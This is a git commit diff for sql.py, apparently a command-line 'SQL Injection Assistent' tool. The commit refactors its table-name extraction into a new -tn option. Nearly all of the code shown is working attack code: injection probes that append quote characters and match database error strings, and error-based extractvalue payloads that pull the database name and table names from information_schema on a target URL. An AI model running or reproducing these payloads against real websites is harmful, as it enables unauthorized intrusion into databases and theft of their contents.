3cb3b47240bf0b59606988a1a60e2e07ef9398f5
Weeke <baileydunlap9@gmail.com>
2020-04-08 19:48:12 -0700

    Update sql.py

--- sql.py
+++ sql.py
@@ -1,20 +1,7 @@
 import requests, argparse, itertools
 from bs4 import BeautifulSoup as BS
 
-def tables_name(url):
-    print("Extracting tables names...")
-            
-    link=link=str(url)+" and extractvalue(1,(select%20group_concat(table_name) from%20information_schema.tables where table_schema=database()))"
-    results = requests.get(link)
-    data = results.text 
-    str_num = str(data).find('error: ')
-    str1_num = data[str_num:]
-    str1 = str1_num[8:]
-    str2 = str1.find('\'')
-    str3 = str1[:str2]
-    print("\nTable names: " + str3)
-
-def Main(test, get_database_type, dbname):
+def Main(test, get_database_type, dbname, tablenames):
     if args.test:
         urls = [args.test + "'", args.test + '"', args.test[:-4] + ';', args.test[:-4] + ")", args.test[:-4] + "')", args.test[:-4] + '")', args.test[:-4] + '*'] 
         vulnerable_text = ['MySQL Query fail:', '/www/htdocs/', 'Query failed', 'mysqli_fetch_array()', 'mysqli_result', 'Warning: ', 'MySQL server', 'SQL syntax', 'You have an error in your SQL syntax;', 'mssql_query()', "Incorrect syntax near '='", 'mssql_num_rows()', 'Notice: ']
@@ -31,6 +18,17 @@ def Main(test, get_database_type, dbname):
                 print('Site is vulnerable!')
         except:
             print('Site is not vulnerable!')
+    elif args.tablenames:
+        print("Extracting tables names...")
+        link = str(args.tablenames) + " and extractvalue(1,(select%20group_concat(table_name) from%20information_schema.tables where table_schema=database()))"
+        results = requests.get(link)
+        data = results.text 
+        str_num = str(data).find('error: ')
+        str1_num = data[str_num:]
+        str1 = str1_num[8:]
+        str2 = str1.find('\'')
+        str3 = str1[:str2]
+        print("\nTable names: " + str3)
     elif args.dbname:
         link = args.dbname + " and extractvalue(1,concat(1,(select database()))) --"
         print(link)
@@ -210,9 +208,11 @@ if __name__ == '__main__':
     ap = argparse.ArgumentParser(prog='sql.py', usage='%(prog)s [options] -t <Target to test for SQLI Vulnerablities>', description='SQL Injection Assistent')
     ap.add_argument('-t', '--test', type=str, help='Test Target for SQLI Vulnerablities')
     ap.add_argument('-gdt', '--get_database_type', type=str, help='Find backend DB type')
-    ap.add_argument('-dbn', '--dbname', type=str, help='Get database name of Target')
+    ap.add_argument('-dbn', '--dbname', type=str, help='Get database name')
+    ap.add_argument('-tn', '--tablenames', type=str, help='Get table names')
     args = ap.parse_args()
     test = args.test
     dbname = args.dbname
+    tablenames = args.tablenames
     get_database_type = args.get_database_type
-    Main(test, get_database_type, dbname)
+    Main(test, get_database_type, dbname, tablenames)
